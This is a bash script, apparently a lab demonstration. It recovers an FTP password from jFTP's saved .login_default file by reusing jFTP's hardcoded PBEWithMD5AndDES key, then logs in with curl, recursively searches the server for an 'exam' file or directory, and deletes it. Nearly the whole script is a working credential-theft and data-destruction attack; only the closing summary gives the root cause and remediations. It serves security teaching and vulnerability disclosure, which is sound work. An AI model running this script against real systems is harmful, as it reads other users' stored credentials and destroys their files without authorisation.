#!/usr/bin/env bash
#
# Simulated attack: recover an FTP password from a REAL jFTP saved-login
# file (.login_default) by exploiting jFTP's hardcoded PBEWithMD5AndDES
# key/salt in Crypto.java, then use the recovered credentials to find and
# delete a "sensitive" exam from an ALREADY-RUNNING pyftpdlib FTP server.
#
# This script does NOT start a server and does NOT write a .login_default
# of its own. It assumes you have already, by hand:
#
#   1. Started the real pyftpdlib server from the pyftpdlib/ directory,
#      e.g. (from inside pyftpdlib/):
#         python3 -m pyftpdlib -i 127.0.0.1 -p 2121 -d . -u ta_exams \
#             -P 'some-password' -w
#      with the exam file (or an exam directory) placed somewhere under
#      that server's document root.
#   2. Started jFTP (e.g. from VS Code / its own build) and connected to
#      that server with "Store passwords" enabled, so jFTP wrote a real
#      .login_default under ~/.jftp/ (Settings.login_def) with the
#      password field encrypted via Crypto.Encrypt().
#
# attack.sh then plays the attacker: it finds that real .login_default,
# decrypts the password with jFTP's own Crypto class, connects to the
# host/port/user it names with a plain FTP client (curl, not jFTP), and
# deletes the exam. The server and jFTP client are both already-running,
# independent processes this script never touches except over the wire.
#
set -euo pipefail

DEMO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${DEMO_DIR}/.." && pwd)"
JFTP_SRC="${JFTP_SRC:-${REPO_ROOT}/jftp}"

if [[ ! -f "${JFTP_SRC}/src/java/net/sf/jftp/config/Crypto.java" ]]; then
    echo "Could not find jftp/src/java/.../Crypto.java under ${JFTP_SRC}" >&2
    echo "Set JFTP_SRC to the path of your jftp/ checkout and re-run." >&2
    exit 1
fi

# On Windows (Git Bash/MSYS/Cygwin), `java`/`javac` are native Win32
# binaries, not MSYS binaries -- they need native "C:\..." paths, not
# POSIX "/c/..." paths. Git Bash normally auto-translates a POSIX path to
# a Windows path for you when an argument IS a path, but -cp here is TWO
# paths joined by ';' inside one argument -- that joined string no longer
# "looks like a path" to the auto-translator, so it's passed through
# unconverted and java.exe can't resolve either half, silently failing to
# find CryptoCli (so decrypt/encrypt calls below produce nothing useful).
# cygpath -w, which ships with Git Bash, converts a path explicitly; use
# it per-component before joining, and fall back to the path unchanged
# everywhere else (where it's already native).
to_native_path() {
    if command -v cygpath >/dev/null 2>&1; then
        cygpath -w "$1"
    else
        printf '%s' "$1"
    fi
}

case "$(uname -s)" in
    CYGWIN*|MINGW*|MSYS*)
        CP_SEP=';'
        CRYPTO_OUT_DIR="$(to_native_path "${DEMO_DIR}/crypto_helper/out")"
        JFTP_LIB_DIR="$(to_native_path "${JFTP_SRC}/lib")"
        ;;
    *)
        CP_SEP=':'
        CRYPTO_OUT_DIR="${DEMO_DIR}/crypto_helper/out"
        JFTP_LIB_DIR="${JFTP_SRC}/lib"
        ;;
esac
CRYPTO_CP="${CRYPTO_OUT_DIR}${CP_SEP}${JFTP_LIB_DIR}"

# Where jFTP actually writes .login_default: Settings.login_def is
# ${user.home}/.jftp/.login_default. Override LOGIN_DEFAULT directly if
# yours lives somewhere else (e.g. you pointed HOME elsewhere, or you're
# testing with a throwaway copy of the file).
JFTP_HOME_DIR="${JFTP_HOME_DIR:-${HOME}/.jftp}"
LOGIN_DEFAULT="${LOGIN_DEFAULT:-${JFTP_HOME_DIR}/.login_default}"

# What to search for / delete on the server once logged in. EXAM_NAME is
# matched case-insensitively against file AND directory names anywhere in
# the tree (not just the top level) via recursive LIST; the first hit
# found is deleted. Override via EXAM_NAME if your exam is named/placed
# differently.
EXAM_NAME="${EXAM_NAME:-exam}"
MAX_DEPTH="${MAX_DEPTH:-6}"

section() { printf '\n=== %s ===\n' "$1"; }

section "0. Locate the leaked saved-login file"
if [[ ! -f "${LOGIN_DEFAULT}" ]]; then
    echo "Could not find ${LOGIN_DEFAULT}" >&2
    echo >&2
    echo "This script expects jFTP to have already connected to the FTP" >&2
    echo "server at least once with 'Store passwords' enabled (Settings >" >&2
    echo "Security > 'Store passwords (encrypted using internal password)'" >&2
    echo "checked), which makes HostChooser write this file via SaveSet on" >&2
    echo "every successful connect (see Settings.login_def in jftp's" >&2
    echo "config/Settings.java)." >&2
    echo >&2
    echo "If jFTP is installed/run under a different user/home directory" >&2
    echo "than this shell, set JFTP_HOME_DIR (or LOGIN_DEFAULT directly) and" >&2
    echo "re-run, e.g.:" >&2
    echo "    LOGIN_DEFAULT=/path/to/.jftp/.login_default ./attack.sh" >&2
    exit 1
fi
echo "found: ${LOGIN_DEFAULT}"
echo "contents (host / user / encrypted-password / port / cwd / lcwd):"
cat "${LOGIN_DEFAULT}"

LD_HOST=$(sed -n '1p' "${LOGIN_DEFAULT}")
LD_USER=$(sed -n '2p' "${LOGIN_DEFAULT}")
LD_ENC_PW=$(sed -n '3p' "${LOGIN_DEFAULT}")
LD_PORT=$(sed -n '4p' "${LOGIN_DEFAULT}")

if [[ -z "${LD_HOST}" || -z "${LD_USER}" || -z "${LD_PORT}" ]]; then
    echo "FAILED: .login_default is missing host/user/port fields." >&2
    exit 1
fi
if [[ -z "${LD_ENC_PW}" ]]; then
    echo "FAILED: .login_default has an empty password field." >&2
    echo "('Store passwords' may be off, or no password was saved for this login.)" >&2
    exit 1
fi

echo
echo "parsed: host=${LD_HOST} user=${LD_USER} port=${LD_PORT}"
echo "stored (encrypted) password field: ${LD_ENC_PW}"

section "1. Decrypt the password using jFTP's own Crypto class"
echo "jFTP 'encrypts' saved passwords with PBEWithMD5AndDES using a password"
echo "and salt that are hardcoded constants in Crypto.java -- identical on"
echo "every install, and visible to anyone with the jFTP source or jar. The"
echo "attacker recompiles/reuses that exact class to decrypt:"

if [[ ! -f "${DEMO_DIR}/crypto_helper/out/CryptoCli.class" ]]; then
    echo "FAILED: ${DEMO_DIR}/crypto_helper/out/CryptoCli.class not found." >&2
    echo "Run ./setup.sh first to compile it." >&2
    exit 1
fi

if ! JAVA_OUT=$(java -cp "${CRYPTO_CP}" CryptoCli decrypt "${LD_ENC_PW}" 2>&1); then
    echo "FAILED: the 'java' command itself errored out:" >&2
    echo "${JAVA_OUT}" >&2
    echo >&2
    echo "classpath used: ${CRYPTO_CP}" >&2
    echo "This usually means one of the two paths in that classpath is wrong" >&2
    echo "for how 'java' expects to see it on this OS -- e.g. on Windows," >&2
    echo "if a POSIX-style /c/... path got passed to the native Windows" >&2
    echo "java.exe instead of a C:\\... path, java.exe can't find CryptoCli" >&2
    echo "on that classpath at all. Verify both halves of the path above" >&2
    echo "actually exist from java's point of view." >&2
    exit 1
fi
RECOVERED_PW="${JAVA_OUT}"

if [[ -z "${RECOVERED_PW}" ]]; then
    echo "FAILED: Crypto.Decrypt() returned an empty string." >&2
    echo "(Is ${LD_ENC_PW} actually ciphertext produced by Crypto.Encrypt()?" >&2
    echo " A plaintext password here would mean 'Store passwords' was off" >&2
    echo " when this login was saved, in which case the field is blank, not" >&2
    echo " this -- so this usually means a corrupted or hand-edited file.)" >&2
    exit 1
fi
echo "  recovered plaintext password: ${RECOVERED_PW}"

section "2. Connect to the already-running FTP server with any FTP client"
echo "Attacker never touches jFTP itself from here on -- just an ordinary"
echo "FTP client (curl) pointed at the host/port/user recovered above."

FTP_BASE="ftp://${LD_HOST}:${LD_PORT}/"
AUTH=(--user "${LD_USER}:${RECOVERED_PW}")

if ! LOGIN_CHECK=$(curl -sS --connect-timeout 10 "${AUTH[@]}" "${FTP_BASE}" 2>&1); then
    echo "FAILED to log in / list the server at ${FTP_BASE} as '${LD_USER}':" >&2
    echo "${LOGIN_CHECK}" >&2
    exit 1
fi
echo "login OK. Root directory listing:"
echo "${LOGIN_CHECK}"

section "3. Recursively search the server for the exam (matching '*${EXAM_NAME}*')"
# Minimal breadth-first walk of the server tree using plain LIST, looking
# for any file or directory whose name contains EXAM_NAME
# (case-insensitive). Two parallel arrays stand in for a queue of
# (ftp-path, depth) pairs -- avoids embedding a literal tab/separator
# inside a single string, which is easy to get wrong in bash.
declare -a queue_paths=("/")
declare -a queue_depths=(0)
FOUND_PATH=""
FOUND_KIND=""   # "file" or "dir"

while [[ ${#queue_paths[@]} -gt 0 ]]; do
    dir_path="${queue_paths[0]}"
    depth="${queue_depths[0]}"
    queue_paths=("${queue_paths[@]:1}")
    queue_depths=("${queue_depths[@]:1}")

    listing=$(curl -sS "${AUTH[@]}" "${FTP_BASE}${dir_path#/}" 2>/dev/null) || continue

    while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        is_dir=0
        [[ "${line}" == d* ]] && is_dir=1
        # strip the first 8 whitespace-separated fields (perms, links,
        # owner, group, size, month, day, time/year), leaving the name
        # (handles filenames containing spaces).
        name=$(printf '%s\n' "${line}" | awk '{for(i=1;i<=8;i++) $i=""; sub(/^ +/,""); print}')
        [[ -z "${name}" ]] && continue

        child_path="${dir_path%/}/${name}"
        lower_name="${name,,}"
        lower_exam="${EXAM_NAME,,}"

        if [[ "${lower_name}" == *"${lower_exam}"* ]]; then
            FOUND_PATH="${child_path}"
            FOUND_KIND=$([[ ${is_dir} -eq 1 ]] && echo dir || echo file)
            break 2
        fi

        if [[ ${is_dir} -eq 1 && ${depth} -lt ${MAX_DEPTH} ]]; then
            queue_paths+=("${child_path}")
            queue_depths+=("$((depth + 1))")
        fi
    done <<< "${listing}"
done

if [[ -z "${FOUND_PATH}" ]]; then
    echo "FAILED: no file or directory matching '*${EXAM_NAME}*' found within" >&2
    echo "${MAX_DEPTH} levels of the server root." >&2
    echo "Set EXAM_NAME to match how the exam is actually named, e.g.:" >&2
    echo "    EXAM_NAME=midterm ./attack.sh" >&2
    exit 1
fi

echo "found ${FOUND_KIND}: ${FOUND_PATH}"

section "4. Delete the exam from the server"
if [[ "${FOUND_KIND}" == "file" ]]; then
    if ! DEL_OUT=$(curl -sS "${AUTH[@]}" -Q "DELE ${FOUND_PATH}" "${FTP_BASE}" 2>&1); then
        echo "FAILED to delete ${FOUND_PATH}:" >&2
        echo "${DEL_OUT}" >&2
        exit 1
    fi
    echo "deleted file: ${FOUND_PATH}"
else
    # Directory: recursively delete its contents (deepest first) then
    # RMD the now-empty directory, exactly as any FTP client would have
    # to -- pyftpdlib's RMD (like the FTP spec) only removes empty dirs.
    echo "exam is a directory; deleting its contents recursively, then the directory itself"

    declare -a del_files=()
    declare -a del_dirs=("${FOUND_PATH}")
    declare -a walk=("${FOUND_PATH}")

    while [[ ${#walk[@]} -gt 0 ]]; do
        cur="${walk[0]}"
        walk=("${walk[@]:1}")
        listing=$(curl -sS "${AUTH[@]}" "${FTP_BASE}${cur#/}/" 2>/dev/null) || continue
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            is_dir=0
            [[ "${line}" == d* ]] && is_dir=1
            name=$(printf '%s\n' "${line}" | awk '{for(i=1;i<=8;i++) $i=""; sub(/^ +/,""); print}')
            [[ -z "${name}" ]] && continue
            child="${cur%/}/${name}"
            if [[ ${is_dir} -eq 1 ]]; then
                del_dirs+=("${child}")
                walk+=("${child}")
            else
                del_files+=("${child}")
            fi
        done <<< "${listing}"
    done

    for f in "${del_files[@]}"; do
        if curl -sS "${AUTH[@]}" -Q "DELE ${f}" "${FTP_BASE}" >/dev/null 2>&1; then
            echo "  deleted file: ${f}"
        else
            echo "  FAILED to delete file: ${f}" >&2
            exit 1
        fi
    done

    # deepest directories first so RMD always sees an empty directory
    for ((i=${#del_dirs[@]}-1; i>=0; i--)); do
        d="${del_dirs[$i]}"
        if curl -sS "${AUTH[@]}" -Q "RMD ${d}" "${FTP_BASE}" >/dev/null 2>&1; then
            echo "  removed directory: ${d}"
        else
            echo "  FAILED to remove directory: ${d}" >&2
            exit 1
        fi
    done
fi

section "5. Verify"
if curl -sS "${AUTH[@]}" "${FTP_BASE}${FOUND_PATH#/}" >/dev/null 2>&1; then
    echo "FAILED: ${FOUND_PATH} still appears to exist on the server." >&2
    exit 1
fi
echo "confirmed: ${FOUND_PATH} is gone from the server."

section "Summary"
cat <<SUMMARY
Root cause: net.sf.jftp.config.Crypto uses a hardcoded password and salt
(PBEWithMD5AndDES) to obscure saved FTP passwords. This is reversible
encryption with a key that is identical for every user and every install,
and is public (it ships in the open-source jar/class files). Anyone who can
read .login_default -- the file jFTP writes under \${user.home}/.jftp/
every time you connect with "Store passwords" enabled -- can recover the
real FTP password without brute-forcing, sniffing traffic, or ever opening
jFTP themselves. "Storing" the password this way is only cosmetically
different from storing it in plaintext.

In this run: recovered the password for user '${LD_USER}' on
${LD_HOST}:${LD_PORT} from ${LOGIN_DEFAULT}, then used an ordinary FTP
client (curl) to find and delete '${FOUND_PATH}' from the already-running
server -- never touching jFTP itself after step 0.

Remediations to point out in a writeup:
  - Never encrypt/obfuscate locally stored secrets with a key that is
    hardcoded in source/bytecode shipped to every user (CWE-321 / CWE-798).
  - Use OS-provided secret storage (keychain/credential manager/DPAPI) or a
    per-install, randomly generated key never written to disk in the clear.
  - Don't rely on a single long-lived shared credential for something as
    sensitive as exam distribution; use short-lived, per-user credentials
    or tokens and rotate/revoke them.
  - Treat "encrypted at rest with a static key" as equivalent to plaintext
    for threat-modeling purposes.
SUMMARY
